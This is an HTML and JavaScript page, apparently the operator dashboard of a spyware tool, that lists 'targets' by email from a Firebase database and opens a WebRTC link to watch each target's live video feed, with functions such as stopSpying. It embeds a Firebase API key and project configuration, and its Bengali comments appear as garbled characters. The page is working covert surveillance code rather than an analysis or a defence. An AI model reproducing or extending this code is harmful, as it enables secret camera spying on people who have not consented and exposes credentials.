    <style>
        body { background: #1a1a1a; color: white; font-family: 'Courier New', monospace; padding: 20px; }
        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
        
        #userList { list-style: none; padding: 0; }

        /* ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶á‡¶®‡¶æ‡¶∞ */
        #videoContainer { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.95); z-index: 100; text-align: center; padding-top: 50px; 
        }
        video { width: 90%; max-width: 600px; border: 2px solid #00ffcc; border-radius: 10px; }

<body>

    <h2>üïµÔ∏è Master Control Room</h2>
    <p id="systemStatus" style="text-align: center; color: #aaa;">Scanning for targets...</p>

    <h3>Target List:</h3>
    <ul id="userList"></ul>

    <div id="videoContainer">
        <h3 id="targetName" style="color: #00ffcc;">Connecting...</h3>
        <video id="remoteVideo" autoplay playsinline controls></video>
        <br>
        <button class="btn btn-close" onclick="stopSpying()">STOP FEED</button>
    </div>

    <script>
        // ‡ßß. ‡¶§‡ßã‡¶∞ ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶®
        const firebaseConfig = {
          apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
          authDomain: "phone-f605e.firebaseapp.com",
          databaseURL: "https://phone-f605e-default-rtdb.firebaseio.com",
          projectId: "phone-f605e",
          storageBucket: "phone-f605e.firebasestorage.app",
          messagingSenderId: "902490805880",
          appId: "1:902490805880:web:98a5ed1432a0e3538e3f8d",
          measurementId: "G-WSJDCYKM3F"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();
        let currentPeer = null;
        let currentTargetId = null;

        // ‡ß®. ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ (‡¶∞‡¶ø‡ßü‡ßá‡¶≤‡¶ü‡¶æ‡¶á‡¶Æ)
        db.ref("users").on("value", snapshot => {
            const list = document.getElementById("userList");
            list.innerHTML = "";
            
            snapshot.forEach(child => {
                const uid = child.key;
                const data = child.val();
                
                // ‡¶∂‡ßÅ‡¶ß‡ßÅ ‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶® ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶¶‡ßá‡¶∞ ‡¶π‡¶æ‡¶á‡¶≤‡¶æ‡¶á‡¶ü ‡¶ï‡¶∞‡¶¨
                const isOnline = data.status === "online";
                const statusClass = isOnline ? "online" : "offline";
                const email = data.email || "Unknown";

                const li = document.createElement("li");
                li.className = "user-card";
                li.innerHTML = `
                    <span>üìß ${email}</span> 
                    <span class="status-badge ${statusClass}">${data.status.toUpperCase()}</span>
                `;
                
                // ‡¶Ö‡¶´‡¶≤‡¶æ‡¶á‡¶® ‡¶π‡¶≤‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶¨‡ßá ‡¶®‡¶æ
                if(isOnline) {
                    li.onclick = () => prepareConnection(uid, email);
                } else {
                    li.style.opacity = "0.5";
                    li.style.cursor = "not-allowed";
                }
                list.appendChild(li);
            });
        });

        // ‡ß©. ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶Ü‡¶ó‡ßá ‡¶∏‡¶¨ ‡¶™‡¶∞‡¶ø‡¶∑‡ßç‡¶ï‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ (Clean Up)
        function prepareConnection(uid, email) {
            document.getElementById("videoContainer").style.display = "block";
            document.getElementById("targetName").innerText = "Connecting to " + email + "...";
            currentTargetId = uid;

            // ‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶∏‡¶ø‡¶ó‡¶®‡ßç‡¶Ø‡¶æ‡¶≤ ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶æ (‡¶ñ‡ßÅ‡¶¨‡¶á ‡¶ú‡¶∞‡ßÅ‡¶∞‡¶ø!)
            db.ref("users/" + uid + "/offer").remove();
            db.ref("users/" + uid + "/answer").remove().then(() => {
                startWebRTC(uid);
            });
        }

        // ‡ß™. ‡¶Æ‡ßá‡¶á‡¶® ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶≤‡¶ú‡¶ø‡¶ï
        function startWebRTC(targetId) {
            // Google STUN Server ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶õ‡¶ø ‡¶≠‡¶æ‡¶≤‡ßã ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶®‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø
            currentPeer = new SimplePeer({ 
                initiator: true, 
                trickle: false,
                config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } 
            });

            // ‡¶∏‡¶ø‡¶ó‡¶®‡ßç‡¶Ø‡¶æ‡¶≤ ‡¶ú‡ßá‡¶®‡¶æ‡¶∞‡ßá‡¶ü ‡¶π‡¶≤‡ßá ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            currentPeer.on('signal', offer => {
                db.ref("users/" + targetId + "/offer").set(offer);
            });

            // ‡¶ü‡¶æ‡¶∞‡ßç‡¶ó‡ßá‡¶ü‡ßá‡¶∞ ‡¶â‡¶§‡ßç‡¶§‡¶∞‡ßá‡¶∞ ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ
            db.ref("users/" + targetId + "/answer").on("value", snapshot => {
                const answer = snapshot.val();
                if (answer && currentPeer) {
                    currentPeer.signal(answer);
                }
            });

            // ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∏‡ßç‡¶ü‡ßç‡¶∞‡ßÄ‡¶Æ ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠ ‡¶ï‡¶∞‡¶æ
            currentPeer.on('stream', stream => {
                document.getElementById("remoteVideo").srcObject = stream;
                document.getElementById("targetName").innerText = "üî¥ LIVE: " + targetId;
            });

            currentPeer.on('error', err => {
                console.log(err);
                alert("Connection Failed! Try reloading.");
                stopSpying();
            });
        }

        // ‡ß´. ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ
        function stopSpying() {
            if (currentPeer) {
                currentPeer.destroy(); // ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶ï‡ßá‡¶ü‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ
                currentPeer = null;
            }
            if (currentTargetId) {
                // ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶ú ‡¶•‡ßá‡¶ï‡ßá ‡¶Ö‡¶´‡¶æ‡¶∞ ‡¶Æ‡ßÅ‡¶õ‡ßá ‡¶´‡ßá‡¶≤‡¶æ
                db.ref("users/" + currentTargetId + "/offer").remove();
                db.ref("users/" + currentTargetId + "/answer").remove();
            }
            
            document.getElementById("videoContainer").style.display = "none";
            document.getElementById("remoteVideo").srcObject = null;
            location.reload(); // ‡¶∏‡ßá‡¶´ ‡¶•‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶™‡ßá‡¶ú ‡¶∞‡¶ø‡¶≤‡ßã‡¶°
        }

    </script>
